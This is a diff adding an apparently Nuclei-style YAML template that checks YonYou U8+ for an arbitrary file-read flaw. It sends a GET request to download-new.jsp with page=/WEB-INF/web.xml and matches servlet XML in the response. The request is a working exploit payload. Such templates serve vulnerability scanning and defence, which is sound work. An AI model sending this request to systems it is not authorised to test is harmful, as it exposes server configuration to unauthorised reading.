@@ -1,0 +1,26 @@
+id: YonYouU8Plus-download-new-ReadAnyFile
+
+info:
+  name: YonYouU8+-download-new-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+   YonYouU8+-download-new-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        GET /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "servlet>"
+          - "servlet-mapping>"
+          - "<?xml"
+        part: body
